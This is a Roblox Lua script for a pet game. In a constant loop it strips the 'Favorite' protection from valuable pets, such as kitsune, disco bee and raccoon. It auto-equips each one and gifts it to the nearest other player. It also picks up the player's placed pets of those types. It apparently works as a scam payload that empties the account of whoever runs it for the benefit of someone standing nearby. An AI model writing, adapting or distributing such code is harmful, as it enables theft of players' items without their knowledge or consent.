warn("[PETGIFT] Script started")

local DEBUG_TAG = "[PETGIFT]"
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local GiftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local PickUpModule = require(
	ReplicatedStorage.Modules.PetServices.PetActionUserInterfaceService.PetActionsHandlers.PickUp
)

-- List of allowed pet types
local ALLOWED_PET_TYPES = { "dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
	"butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl", "t-rex", "bunny" }

local function debugPrint(...)
	print(DEBUG_TAG, ...)
end

-- Pet type check
local function isPetTypeMatch(text, exact)
	local lowerText = text:lower()
	for _, petType in ipairs(ALLOWED_PET_TYPES) do
		if exact then
			if lowerText == petType then
				return true
			end
		else
			if lowerText:find(petType) then
				return true
			end
		end
	end
	return false
end

-- Find nearest other player
local function getNearestPlayer()
	local nearest, nearestDist
	local myChar = LocalPlayer.Character
	if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			local dist = (plr.Character.HumanoidRootPart.Position - myChar.HumanoidRootPart.Position).Magnitude
			if not nearestDist or dist < nearestDist then
				nearestDist = dist
				nearest = plr
			end
		end
	end
	return nearest
end

-- Find pet model in workspace by UUID
local function findPlacedPetByUUID(uuid)
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:GetAttribute("UUID") == uuid then
			return obj
		end
	end
	return nil
end

-- Gift a pet without manual equip
local function giftPetDirectly(pet)
	debugPrint("Unfavoriting pet:", pet.Name)
	pet:SetAttribute("Favorite", false)

	local target = getNearestPlayer()
	if target then
		debugPrint("Temporarily parenting", pet.Name, "to Character for gifting")
		local originalParent = pet.Parent
		pet.Parent = LocalPlayer.Character
		task.wait() -- allow Roblox to register it as equipped

		debugPrint("Gifting", pet.Name, "to", target.Name)
		GiftRemote:FireServer("GivePet", pet)

		-- If gifting failed and pet still exists, restore its parent
		if pet.Parent and pet.Parent == LocalPlayer.Character then
			pet.Parent = originalParent
		end
	else
		debugPrint("No target player found for", pet.Name)
	end
end

-- Step 1: Gift pets from backpack or character (partial match on name)
local function checkAndGiftFromContainer(container)
	if not container then return end
	for _, pet in ipairs(container:GetChildren()) do
		if pet:IsA("Tool") and isPetTypeMatch(pet.Name, false) then
			debugPrint("Found candidate pet in", container.Name, ":", pet.Name)
			giftPetDirectly(pet)
		end
	end
end


-- Pick up placed pets
local function pickUpPlacedPets()
	local activeUI = LocalPlayer.PlayerGui:FindFirstChild("ActivePetUI")
	if not activeUI then
		return
	end

	local scroll = activeUI:FindFirstChild("Frame")
		and activeUI.Frame:FindFirstChild("Main")
		and activeUI.Frame.Main:FindFirstChild("ScrollingFrame")

	if not scroll then
		return
	end

	for _, petFrame in ipairs(scroll:GetChildren()) do
		if petFrame:IsA("Frame") 
			and petFrame:FindFirstChild("PET_TYPE") 
			and petFrame.Name ~= "PetTemplate" then

			local petType = petFrame.PET_TYPE.Text
			if isPetTypeMatch(petType, true) then
				local uuid = petFrame.Name
				local petModel = findPlacedPetByUUID(uuid)
				if petModel then
					debugPrint("Picking up placed pet:", petType)
					PickUpModule.Activate(petModel)
					task.wait(0.05)
				end
			end
		end
	end
end

-- Main loop
debugPrint("Starting pet gifting + pickup loop")
task.spawn(function()
	while true do
		task.wait(0.1)
		checkAndGiftFromContainer(LocalPlayer.Backpack)
		checkAndGiftFromContainer(LocalPlayer.Character)
		pickUpPlacedPets()
	end
end)
